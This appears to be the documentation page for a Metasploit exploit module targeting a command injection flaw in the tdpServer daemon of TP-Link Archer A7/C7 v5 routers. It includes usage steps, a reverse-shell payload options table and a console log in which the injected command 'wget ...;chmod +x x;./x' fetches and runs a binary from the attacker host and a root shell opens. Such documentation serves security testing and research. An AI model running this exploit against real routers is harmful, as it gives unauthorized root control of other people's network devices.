{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/misc/tplink_archer_a7_c7_lan_rce","result":{"data":{"moduleMetadataJson":{"id":"ab5a173a-0423-5682-8500-d792b05e4e38","name":"TP-Link Archer A7/C7 Unauthenticated LAN Remote Code Execution","fullname":"exploit/linux/misc/tplink_archer_a7_c7_lan_rce","description":"This module exploits a command injection vulnerability in the tdpServer daemon (/usr/bin/tdpServer), running on\n          the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726.\n          The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does\n          not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command\n          as root, including downloading and executing a binary from another host.\n          This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +\n          Radek Domanski).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/misc/tplink_archer_a7_c7_lan_rce","documentationSlug":"/modules/documentation/exploit/linux/misc/tplink_archer_a7_c7_lan_rce"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a command injection vulnerability in the tdpServer daemon (/usr/bin/tdpServer), running on the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726.\nThe vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.</p>\n<p>This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro + Radek Domanski).</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>TP-Link Archer A7 (AC1750) v5 firmware version 190726\nTP-Link Archer C7 (AC1750) v5 firmware version 190726</p>\n<p><a href=\"https://static.tp-link.com/2019/201908/20190827/Archer%20A7(EU)_V5_190811.zip\">Firmware TP-Link Archer A7</a>\n<a href=\"https://static.tp-link.com/2019/201908/20190816/Archer%20C7(EU)_V5_190726.zip\">Firmware TP-Link Archer C7</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Example steps in this format (is also in the PR):</p>\n<ol>\n<li>Connect to a target on the LAN interface</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploits/linux/misc/tplink_archer_a7_c7_lan_rce</code></li>\n<li>Set RHOST, LHOST and SRVHOST</li>\n<li>Do <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Module options (exploit/linux/misc/tplink_archerC7_lan_rce):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT    20002            yes       The target port (TCP)\n   SRVHOST                   yes       IP address of the host serving the exploit\n   SSL      false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                   no        The URI to use for this exploit (default is random)\n   VHOST                     no        HTTP server virtual host\n\n\nPayload options (linux/mipsbe/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploits/linux/misc/tplink_archer_a7_c7_lan_rce\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; set RHOST 192.168.0.1\nRHOST =&gt; 192.168.0.1\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; set LHOST 192.168.0.238\nLHOST =&gt; 192.168.0.238\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; set SRVHOST 192.168.0.238\nSRVHOST =&gt; 192.168.0.238\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; check \n[+] 192.168.0.1:20002 - The target is vulnerable.\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; run\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; \n[*] Started reverse TCP handler on 192.168.0.238:4444 \n[*] Attempting to exploit TP-Link Archer A7/C7 (AC1750) v5 (firmware 190726)\n[*] Starting up our web service on http://192.168.0.238:4445 ...\n[*] Using URL: http://192.168.0.238:4445/x\n[*] 192.168.0.1:20002 - Connecting to the target\n[*] 192.168.0.1:20002 - Sending command file byte by byte\n[*] 192.168.0.1:20002 - Command: wget http://192.168.0.238:4445/x;chmod +x x;./x\n[*] 192.168.0.1:20002 - [0%]= = =&gt; - - - - - - - - - - - - - - - -[100%]\n[*] 192.168.0.1:20002 - [0%]= = = = = = =&gt; - - - - - - - - - - - -[100%]\n[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = =&gt; - - - - - - - -[100%]\n[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = = = = = =&gt; - - - -[100%]\n[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = = = = = = = = = =&gt;[100%]\n[*] 192.168.0.1:20002 - Command file sent, attempting to execute...\n[+] 192.168.0.1:20002 - Sending executable to the router\n[+] 192.168.0.1:20002 - Sit back and relax, Shelly will come visit soon!\n[*] Command shell session 1 opened (192.168.0.238:4444 -&gt; 192.168.0.1:48112) at 2020-03-26 16:47:09 +0100\n[*] Server stopped.\n\nmsf5 exploit(linux/misc/tplink_archer_a7_c7_lan_rce) &gt; sessions 1\n[*] Starting interaction with 1...\n\nid\nuid=0(root) gid=0(root)\nuname -a\nLinux ArcherC7v5 3.3.8 #1 Mon May 20 18:53:02 CST 2019 mips GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ab5a173a-0423-5682-8500-d792b05e4e38"}}}